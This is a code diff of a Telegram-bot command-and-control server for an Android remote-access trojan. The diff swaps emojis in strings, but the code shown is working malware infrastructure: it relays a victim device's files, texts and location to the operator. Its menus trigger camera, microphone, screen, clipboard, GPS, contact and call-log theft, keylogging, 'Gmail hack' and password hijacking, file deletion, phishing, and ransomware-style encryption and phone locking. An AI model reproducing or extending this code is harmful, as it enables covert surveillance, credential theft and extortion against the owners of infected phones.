@@ -31,7 +31,7 @@ app.get('/', function (req, res) {
 app.post("/uploadFile", upload.single('file'), (req, res) => {
     const name = req.file.originalname
     appBot.sendDocument(id, req.file.buffer, {
-            caption: `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🦾`,
+            caption: `°• 📱😋𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🔥`,
             parse_mode: "HTML"
         },
         {
@@ -41,7 +41,7 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     res.send('')
 })
 app.post("/uploadText", (req, res) => {
-    appBot.sendMessage(id, `°• 𓅂🪧𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🦾\n\n` + req.body['text'], {parse_mode: "HTML"})
+    appBot.sendMessage(id, `°• 📱😋𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐅𝐫𝐨𝐦 <b>${req.headers.model}</b> 𝐌𝐚𝐜𝐡𝐢𝐧𝐞🔥\n\n` + req.body['text'], {parse_mode: "HTML"})
     res.send('')
 })
 app.post("/uploadLocation", (req, res) => {
@@ -66,7 +66,7 @@ appSocket.on('connection', (ws, req) => {
         provider: provider
     })
     appBot.sendMessage(id,
-        `°• 🤡𝐆𝐎𝐓 𝐀 𝐍𝐄𝐖 𝐏𝐇𝐎𝐍𝐄🤡\n\n` +
+        `°• 👹𝐆𝐎𝐓 𝐀 𝐍𝐄𝐖 𝐏𝐇𝐎𝐍𝐄👹\n\n` +
         `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
         `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
         `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
@@ -76,7 +76,7 @@ appSocket.on('connection', (ws, req) => {
     )
     ws.on('close', function () {
         appBot.sendMessage(id,
-            `°• 😫𝐏𝐇𝐎𝐍𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐆𝐎𝐍𝐄😖\n\n` +
+            `°• 💩𝐏𝐇𝐎𝐍𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐆𝐎𝐍𝐄💩\n\n` +
             `• ᴅᴇᴠɪᴄᴇ ᴍᴏᴅᴇʟ : <b>${model}</b>\n` +
             `• ʙᴀᴛᴛᴇʀʏ : <b>${battery}</b>\n` +
             `• ᴀɴᴅʀᴏɪᴅ ᴠᴇʀꜱɪᴏɴ : <b>${version}</b>\n` +
@@ -90,15 +90,15 @@ appSocket.on('connection', (ws, req) => {
 appBot.on('message', (message) => {
     const chatId = message.chat.id;
     if (message.reply_to_message) {
-        if (message.reply_to_message.text.includes('°• 🗯️𝐑𝐞𝐩𝐥𝐲 𝐎𝐟 𝐘𝐨𝐮𝐫 𝐕𝐢𝐜𝐭𝐢𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞🌨️')) {
+        if (message.reply_to_message.text.includes('°• 🗯️𝐑𝐞𝐩𝐥𝐲 𝐎𝐟 𝐘𝐨𝐮𝐫 𝐕𝐢𝐜𝐭𝐢𝐦 𝐌𝐞𝐬𝐬𝐚𝐠𝐞🥶')) {
             currentNumber = message.text
             appBot.sendMessage(id,
-                '°• 🏜️𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐞𝐧𝐝 𝐓𝐨 𝐓𝐡𝐢𝐬 𝐍𝐮𝐦𝐛𝐞𝐫🌲\n\n' +
+                '°• 😇𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐞𝐧𝐝 𝐓𝐨 𝐓𝐡𝐢𝐬 𝐍𝐮𝐦𝐛𝐞𝐫🤕\n\n' +
                 '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
                 {reply_markup: {force_reply: true}}
             )
         }
-        if (message.reply_to_message.text.includes('°• 🏜️𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐞𝐧𝐝 𝐓𝐨 𝐓𝐡𝐢𝐬 𝐍𝐮𝐦𝐛𝐞𝐫🌲')) {
+        if (message.reply_to_message.text.includes('°• 🤯𝐆𝐨𝐨𝐝, 𝐍𝐨𝐰 𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐒𝐞𝐧𝐝 𝐓𝐨 𝐓𝐡𝐢𝐬 𝐍𝐮𝐦𝐛𝐞𝐫🤡')) {
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
                     ws.send(`send_message:${currentNumber}/${message.text}`)
@@ -112,7 +112,7 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                         'resize_keyboard': true
                     }
                 }
@@ -132,13 +132,13 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 🍬𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐏𝐚𝐭𝐡 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝📻')) {
+        if (message.reply_to_message.text.includes('°• 🍬𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐏𝐚𝐭𝐡 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝💌')) {
             const path = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -152,13 +152,13 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 🌠𝐆𝐢𝐯𝐞 𝐓𝐡𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐞𝐥𝐞𝐭𝐞🗑️')) {
+        if (message.reply_to_message.text.includes('°• 💌𝐆𝐢𝐯𝐞 𝐓𝐡𝐞 𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧 𝐎𝐟 𝐖𝐡𝐚𝐭𝐞𝐯𝐞𝐫 𝐘𝐨𝐮 𝐖𝐚𝐧𝐭 𝐓𝐨 𝐃𝐞𝐥𝐞𝐭𝐞🗑️')) {
             const path = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -172,13 +172,13 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.reply_to_message.text.includes('°• 🕍𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐓𝐢𝐦𝐞 𝐨𝐟  𝐘𝐨𝐮  𝐖𝐚𝐧𝐭 𝐑𝐞𝐜𝐨𝐫𝐝 𝐌𝐢𝐜𝐫𝐨𝐩𝐡𝐨𝐧𝐞🦮')) {
+        if (message.reply_to_message.text.includes('°• 🎙️𝐄𝐧𝐭𝐞𝐫 𝐓𝐡𝐞 𝐓𝐢𝐦𝐞 𝐨𝐟  𝐘𝐨𝐮  𝐖𝐚𝐧𝐭 𝐑𝐞𝐜𝐨𝐫𝐝 𝐌𝐢𝐜𝐫𝐨𝐩𝐡𝐨𝐧𝐞🦴')) {
             const duration = message.text
             appSocket.clients.forEach(function each(ws) {
                 if (ws.uuid == currentUuid) {
@@ -192,7 +192,7 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
                         'resize_keyboard': true
                     }
                 }
@@ -212,7 +212,7 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                         'resize_keyboard': true
                     }
                 }
@@ -232,7 +232,7 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                         'resize_keyboard': true
                     }
                 }
@@ -252,7 +252,7 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                         'resize_keyboard': true
                     }
                 }
@@ -281,7 +281,7 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                         'resize_keyboard': true
                     }
                 }
@@ -301,7 +301,7 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                         'resize_keyboard': true
                     }
                 }
@@ -311,7 +311,7 @@ appBot.on('message', (message) => {
     if (id == chatId) {
         if (message.text == '/start') {
             appBot.sendMessage(id,
-                '°•🌹𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝐒𝐄𝐑𝐕𝐄𝐑🌷\n\n' +
+                '°•💀𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝐒𝐄𝐑𝐕𝐄𝐑💀\n\n' +
                 '• ɪꜰ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ, ᴡᴀɪᴛ ꜰᴏʀ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ\n\n' +
                 '• ᴡʜᴇɴ ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴍᴇꜱꜱᴀɢᴇ, ɪᴛ ᴍᴇᴀɴꜱ ᴛʜᴀᴛ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ ɪꜱ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀɴᴅ ʀᴇᴀᴅʏ ᴛᴏ ʀᴇᴄᴇɪᴠᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ\n\n' +
                 '• ᴄʟɪᴄᴋ ᴏɴ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ ʙᴜᴛᴛᴏɴ ᴀɴᴅ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴅᴇᴠɪᴄᴇ ᴛʜᴇɴ ꜱᴇʟᴇᴄᴛ ᴛʜᴇ ᴅᴇꜱɪʀᴇᴅ ᴄᴏᴍᴍᴀɴᴅ ᴀᴍᴏɴɢ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ\n\n' +
@@ -320,13 +320,13 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                        "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                         'resize_keyboard': true
                     }
                 }
             )
         }
-        if (message.text == '📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮') {
+        if (message.text == '⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡') {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
                     '°• 🚏𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 ❌\n\n' +
@@ -344,7 +344,7 @@ appBot.on('message', (message) => {
                 appBot.sendMessage(id, text, {parse_mode: "HTML"})
             }
         }
-        if (message.text == '📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬') {
+        if (message.text == '⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐') {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
                     '°• 🚏𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞 𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝 ❌\n\n' +
@@ -383,19 +383,19 @@ appBot.on("callback_query", (callbackQuery) => {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        {text: '🍏𝐀𝐏𝐏𝐒🍏', callback_data: `apps:${uuid}`},
+                        {text: '📜𝐀𝐏𝐏𝐒📜', callback_data: `apps:${uuid}`},
                         {text: '⚽𝐏𝐇𝐎𝐍𝐄 𝐈𝐍𝐅𝐎⚽', callback_data: `device_info:${uuid}`}
                     ],
                     [
-                        {text: '🍫𝐆𝐄𝐓 𝐅𝐢𝐋𝐄🍫', callback_data: `file:${uuid}`},
+                        {text: '💌𝐆𝐄𝐓 𝐅𝐢𝐋𝐄💌', callback_data: `file:${uuid}`},
                         {text: '🏆𝐃𝐄𝐋𝐄𝐓𝐄 𝐅𝐢𝐋𝐄🏆', callback_data: `delete_file:${uuid}`}
                     ],
                     [
-                        {text: '🧨𝐋𝐢𝐕𝐄 𝐒𝐂𝐑𝐄𝐄𝐍🧨', callback_data: `screenshot:${uuid}`},
-                        {text: '☎️𝐅𝐁/𝐈𝐍𝐒𝐓𝐀/𝐓𝐆☎️', callback_data: `whatsapp:${uuid}`},
+                        {text: '📱𝐋𝐢𝐕𝐄 𝐒𝐂𝐑𝐄𝐄𝐍📱', callback_data: `screenshot:${uuid}`},
+                        {text: '📵𝐅𝐁/𝐈𝐍𝐒𝐓𝐀/𝐓𝐆📵', callback_data: `whatsapp:${uuid}`},
                     ],
                     [
-                        {text: '⛄𝐂𝐋𝐈𝐏𝐁𝐎𝐀𝐑𝐃⛄', callback_data: `clipboard:${uuid}`},
+                        {text: '🥶𝐂𝐋𝐈𝐏𝐁𝐎𝐀𝐑𝐃🥶', callback_data: `clipboard:${uuid}`},
                         {text: '🥤𝐒𝐎𝐔𝐍𝐃 𝐑𝐄𝐂𝐎𝐑𝐃🥤', callback_data: `microphone:${uuid}`},
                     ],
                     [
@@ -403,16 +403,16 @@ appBot.on("callback_query", (callbackQuery) => {
                         {text: '🚸𝐅𝐑𝐎𝐍𝐓 𝐂𝐀𝐌𝐄𝐑𝐀🚸', callback_data: `camera_selfie:${uuid}`}
                     ],
                     [
-                        {text: '📟𝐋𝐢𝐕𝐄 𝐆𝐏𝐒📟', callback_data: `location:${uuid}`},
+                        {text: '🛰️𝐋𝐢𝐕𝐄 𝐆𝐏𝐒🛰️', callback_data: `location:${uuid}`},
                         {text: '🖥️𝐄𝐂𝐇𝐎 𝐒𝐌𝐒🖥️', callback_data: `toast:${uuid}`}
                     ],
                      [
                         {text: '🥃𝐂𝐎𝐎𝐊𝐈𝐄🥃', callback_data: `Settings:${uuid}`},
-                        {text: '🍁𝐆𝐌𝐀𝐈𝐋 𝐇𝐀𝐂𝐊🍁', callback_data: `Erase_data:${uuid}`},
+                        {text: '🦴𝐆𝐌𝐀𝐈𝐋 𝐇𝐀𝐂𝐊🦴', callback_data: `Erase_data:${uuid}`},
                     ],
                     [
                         {text: '🎻𝐂𝐀𝐋𝐋 𝐇𝐢𝐒𝐓𝐎𝐑𝐘🎻', callback_data: `calls:${uuid}`},
-                        {text: '♐𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐋𝐢𝐒𝐓♐', callback_data: `contacts:${uuid}`}
+                        {text: '👹𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐋𝐢𝐒𝐓👹', callback_data: `contacts:${uuid}`}
                     ],
                     [
                         {text: '🚳𝐕𝐢𝐁𝐑𝐀𝐓𝐄🚳', callback_data: `vibrate:${uuid}`},
@@ -423,7 +423,7 @@ appBot.on("callback_query", (callbackQuery) => {
                         {text: '🛍️𝐒𝐌𝐒 𝐒𝐄𝐍𝐃🛍️', callback_data: `send_message:${uuid}`}
                     ],
                     [
-                        {text: '🌋𝐏𝐑𝐢𝐕𝐀𝐓𝐄 𝐏𝐢𝐜🌋', callback_data: `Ransomware:${uuid}`},
+                        {text: '🤷𝐏𝐑𝐢𝐕𝐀𝐓𝐄 𝐏𝐢𝐜🤷', callback_data: `Ransomware:${uuid}`},
                         {text: '🛰️𝐈𝐍𝐒𝐓𝐀𝐋𝐋 𝐀𝐏𝐏🛰️', callback_data: `custom_phishing:${uuid}`},
                     ],
                     [
@@ -437,12 +437,12 @@ appBot.on("callback_query", (callbackQuery) => {
                         }
                     ],
                     [
-                        {text: '🏟️𝐏𝐇𝐎𝐍𝐄 𝐋𝐎𝐂𝐊🏟️', callback_data: `encrypt_data:${uuid}`},
-                        {text: '🏛️𝐔𝐍𝐋𝐎𝐂𝐊 𝐏𝐇𝐎𝐍𝐄🏛️', callback_data: `decrypt_data:${uuid}`},
+                        {text: '🔴𝐏𝐇𝐎𝐍𝐄 𝐋𝐎𝐂𝐊🔴', callback_data: `encrypt_data:${uuid}`},
+                        {text: '🔵𝐔𝐍𝐋𝐎𝐂𝐊 𝐏𝐇𝐎𝐍𝐄🔵', callback_data: `decrypt_data:${uuid}`},
                     ],
                     [
-                        {text: '🛒𝐂𝐓𝐑𝐋 𝐒𝐂𝐑𝐄𝐄𝐍🛒', callback_data: `keylogger_on:${uuid}`},
-                        {text: '🪆𝐏𝐀𝐒𝐒 𝐇𝐢𝐉𝐀𝐂𝐊🪆', callback_data: `keylogger_off:${uuid}`},
+                        {text: '📱𝐂𝐓𝐑𝐋 𝐒𝐂𝐑𝐄𝐄𝐍📵', callback_data: `keylogger_on:${uuid}`},
+                        {text: '🥲𝐏𝐀𝐒𝐒 𝐇𝐢𝐉𝐀𝐂𝐊🥶', callback_data: `keylogger_off:${uuid}`},
                     ],
                 ]
             },
@@ -462,7 +462,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                    "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                     'resize_keyboard': true
                 }
             }
@@ -481,7 +481,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                    "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                     'resize_keyboard': true
                 }
             }
@@ -500,7 +500,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                    "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                     'resize_keyboard': true
                 }
             }
@@ -519,7 +519,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                    "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                     'resize_keyboard': true
                 }
             }
@@ -538,7 +538,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
-                    "keyboard": [["📮(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)📮"], ["📡𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝🔬"]],
+                    "keyboard": [["⚡(𝐀𝐜𝐭𝐢𝐯𝐞 𝐌𝐚𝐜𝐡𝐢𝐧𝐞)⚡"], ["⭐𝐂𝐨𝐧𝐭𝐫𝐨𝐥 ~ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝⭐"]],
                     'resize_keyboard': true
                 }
             }
@@ -557,7 +557,7 @@ appBot.on("callback_query", (callbackQuery) => {
             {
                 parse_mode: "HTML",
                 "reply_markup": {
